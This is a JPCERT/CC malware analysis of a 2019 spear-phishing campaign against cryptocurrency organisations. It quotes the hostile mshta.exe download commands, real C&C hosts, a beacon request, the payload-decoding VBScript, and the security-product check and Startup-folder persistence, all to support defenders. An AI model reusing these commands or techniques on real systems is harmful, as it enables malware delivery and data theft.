<h2 class="entry-title">Spear Phishing against Cryptocurrency Businesses</h2>
<section class="entry-tags">
<ul>
</ul>
</section>
<div class="entry-social-buttons entry-social-buttons--before-content clearfix">
<ul>

</ul>

<section class="entry-content clearfix">
<p>As of June 2019, JPCERT/CC has observed targeted emails to some Japanese organisations. These emails contain a URL to a cloud service and convince recipients to download a zip file which contains a malicious shortcut file. This article will describe the details of the attack method. </p>
<h3>How the VBScript downloader is launched</h3>
<p>The zip file downloaded from the URL in the email contains a password-protected decoy document and a shortcut file “Password.txt.lnk”.
This shortcut file contains some commands, and they run when the file is executed. The below image illustrates the flow of events from the shortcut file being executed until the VBScript-based downloader is launched.
<figure class="mt-figure mt-figure-center"><img alt="Figure 1： Flow of events from running the shortcut file to infecting a host" class="asset asset-image at-xid-1076565 mt-image-center" height="498" src="https://blogs.jpcert.or.jp/en/.assets/thumbnail/01-480wri.png" style="display: block; margin-left: auto; margin-right: auto;" width="480"><figcaption>Figure 1： Flow of events from running the shortcut file to infecting a host</figcaption></img></figure></p>
<p>The shortcut file contains the following command:</p>
<pre>
C:\Windows\System32\mshta.exe https://bit.ly/31O88c3
</pre>
<p>When a user accesses the shortened URL, they will be redirected to the following site, and an HTML file containing the VBScript (Figure 2) is downloaded.</p>
<pre>
http://service.amzonnews.club:8080/open?id=3F%2BE7HwXzwMRiysADDAgev15bAPluuPYB%2BufUnqYMCw%3D
</pre>
<p><figure class="mt-figure mt-figure-center"><img alt="Figure 2： HTML file downloaded by the shortcut file" class="asset asset-image at-xid-1076566 mt-image-center" height="625" src="https://blogs.jpcert.or.jp/en/.assets/thumbnail/02-640wri.png" style="display: block; margin-left: auto; margin-right: auto;" width="640"><figcaption>Figure 2： HTML file downloaded by the shortcut file</figcaption></img></figure></p>
<p>The behaviour of the VBScript is described in Figure 3. First, it creates and displays a text file that contains the password for the decoy document. Then, it creates a VBS file (oezjrjua.vbs) in %TEMP% directory and executes it.  It also lists the processes running in the environment and checks whether any of them contains specific strings ("hudongf" or "qhsafe"). If these are not included, then a shortcut file (xBoxOne.lnk) is created in the Startup folder. It is assumed that this process is meant to check strings that Qihoo 360 security products contain (zhudongfangyu.exe, qhsafemain.exe).</p>
<p><figure class="mt-figure mt-figure-center"><img alt="Figure 3： Behaviour of VBScript in the HTML file" class="asset asset-image at-xid-1076577 mt-image-center" height="421" src="https://blogs.jpcert.or.jp/en/.assets/thumbnail/blog_flow_en-320wri.jpg" style="display: block; margin-left: auto; margin-right: auto;" width="320"/><figcaption>Figure 3： Behaviour of VBScript in the HTML file</figcaption></figure></p>
<h4>Details of xBoxOne.lnk</h4>
<p>xBoxOne.lnk is a shortcut file and contains the following command:</p>
<pre>
C:\Windows\System32\mshta.exe https://bit.ly/2SGs76y
</pre>
<p>When a user accesses the shortened URL, they will be redirected to the following site:</p>
<pre>
http://update.gdrives.top:8080/open?id=b7hMO0D%2ByNbNZSqXu4Putub%2BZLLqg/S66Foz0YKUjety914cQmWz32MV6BE44pEd
</pre>
<p>This shortcut file is created in the Startup folder and executed when the login is processed. As of 26 June 2019, JPCERT/CC was not able to confirm the details of the site as the hostname could not be resolved.</p>
<h4>Details of oezjrjua.vbs</h4>
<p>oezjrjua.vbs is a downloader which sends a POST request every 3 minutes and executes the received data as VBScript. The following is an example.</p>
<pre>
POST /open?topics=s9[random 3-digit numeric]
HTTP/1.1
Accept: */*
Accept-Language: ja
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
Host: 75.133.9.84:8080
Content-Length: 7426
Connection: Keep-Alive
Cache-Control: no-cache

200
</pre>
<h4>Details of VBScript downloaded by oezjrjua.vbs</h4>
<p>JPCERT/CC has confirmed that the VBScript (Figure 4) is received and executed in response to the POST request from oezjrjua.vbs.</p>
<p><figure class="mt-figure mt-figure-center"><img alt="Figure 4：VBScript executed by oezjrjua.vbs (snipped)" class="asset asset-image at-xid-1076569 mt-image-center" height="807" src="https://blogs.jpcert.or.jp/en/.assets/thumbnail/04-640wri.png" style="display: block; margin-left: auto; margin-right: auto;" width="640"/><figcaption>Figure 4：VBScript executed by oezjrjua.vbs (snipped)</figcaption></figure></p>
<p>The executed VBScript collects information of the infected device and sends it to the attacker’s server every minute. The following information is sent:</p>
<ul>
<li>Username</li>
<li>Host name</li>
<li>OS version</li>
<li>OS install date</li>
<li>OS run time</li>
<li>Time zone</li>
<li>CPU name</li>
<li>Execution path of oezjrjua.vbs</li>
<li>Network adapter information</li>
<li>List of running processes</li>
</ul>
<p>If the response to the data contains  “20”, encoded data will be downloaded. It can be decoded with the following codes:</p>
<pre>
n=InStr(1,res,"#")                   // Finds # in the response
key=CLng("&amp;h" &amp; Mid(res,1,n-1))   // Extract the  key
psc=Mid(ret,n+1,Len(res)-n)        // Extracts encoded data
sc=base64dec(psc)                    // Base64 decoding (1st time)
psc=CStr(xor(sc,key))               // XOR processing on the key
NStep=base64dec(psc)                // Base64 decoding (2nd time)
</pre>
<p>The decoded data is expected to be VBScript, and it will be executed when it is correctly decoded. As of now, we have no clue about what kind of malware will be downloaded as a result since the encoded data is not accessible. It is assumed that attackers would inject some malicious files according to the victim’s environmental information .</p>
<h3>Access to the shortened URL</h3>
<p>JPCERT/CC observed a limited number of access to the shortened URL (Figure 5). This implies that the attack was conducted against a very limited range of targets.</p>
<p><figure class="mt-figure mt-figure-center"><img alt="Figure 5： Access counts to the shortened URL (snipped)" class="asset asset-image at-xid-1076571 mt-image-center" height="212" src="https://blogs.jpcert.or.jp/en/.assets/thumbnail/05-640wri.png" style="display: block; margin-left: auto; margin-right: auto;" width="640"/><figcaption>Figure 5： Access counts to the shortened URL (snipped)</figcaption></figure></p>
<h3>In closing</h3>
<p>In this series of attacks, we have observed that attackers change some parts of encoding and conditions  for each attempt. It is likely that this type of attack continues with some customisation. Details about the shortcut file is available in Appendix A, list of samples in Appendix B and C&amp;C servers in Appendix C.</p>
<p>The hash values and C&amp;C servers of some variants are listed in Appendix D and E . Please make sure that none of your devices is communicating to the C&amp;C servers listed in Appendix C or E. These samples were mostly decoy documents with subjects about cryptocurrency. We are aware that some of these documents have been sent to organisations that are related to cryptocurrencies. We assume that this attack campaign specifically targets cryptocurrency operators and related entities.</p>
<p style="text-align: right">Tomoaki Tani<br/><em>(Translated by Yukako Uchida)</em></p>
